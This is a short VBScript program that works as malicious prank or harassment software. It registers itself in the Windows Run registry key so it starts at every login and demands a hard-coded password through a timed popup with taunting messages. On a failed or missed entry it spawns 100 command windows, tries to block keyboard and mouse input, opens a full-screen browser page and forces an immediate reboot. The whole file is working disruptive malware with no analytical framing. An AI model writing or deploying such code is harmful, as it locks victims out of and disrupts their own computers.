Dim fso, wscr, password, userInput, imageURL, localImagePath, regKey, scriptPath, http, passwordInputWindow, timerExpired
Set fso = CreateObject("Scripting.FileSystemObject")
Set wscr = CreateObject("WScript.Shell")
Set http = CreateObject("MSXML2.ServerXMLHTTP")
password = "jYubm4C8PDhZ-bZvFOXC"
imageURL = "https://www.google.ru/url?sa=i&url=https%3A%2F%2Fwww.pinterest.com%2Fpin%2F508766089153176636%2F&psig=AOvVaw0Q65mwGWtstWjzl6dVBXJq&ust=1729281575884000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCPDclISalokDFQAAAAAdAAAAABAE"
scriptPath = WScript.ScriptFullName
regKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\xDv1"
wscr.RegWrite regKey, scriptPath
timerExpired = False
passwordInputWindow = "try)"
Set inputTimer = CreateObject("WScript.Shell")
WScript.Sleep 500
userInput = ""
For i = 1 To 50
    userInput = inputTimer.Popup(passwordInputWindow, 1, "try to life...", 4096 + 48)
    If userInput <> "" Then
        Exit For
    End If
    WScript.Sleep 100
Next
If userInput = "" Then
    timerExpired = True
End If
If userInput = password And Not timerExpired Then
    MsgBox "fuck u("
    If fso.FileExists(scriptPath) Then
        On Error Resume Next
        wscr.RegDelete regKey
        On Error GoTo 0
    End If
Else
    If timerExpired Then
        MsgBox "ur life is ended"
    Else
        MsgBox "ur life is ended"
    End If
    For i = 1 To 100
        wscr.Run "cmd.exe", 1, False
        WScript.Sleep 100
    Next
    WScript.Sleep 1000
    wscr.Run "rundll32 user32.dll,BlockInput True", 0, True
    Set ie = CreateObject("InternetExplorer.Application")
    ie.Visible = True
    ie.FullScreen = True
    ie.Navigate imageURL
    WScript.Sleep 3000
    ie.Quit
    wscr.Run "rundll32 user32.dll,BlockInput False", 0, True
    wscr.Run "shutdown /r /f /t 0", 0, False
End If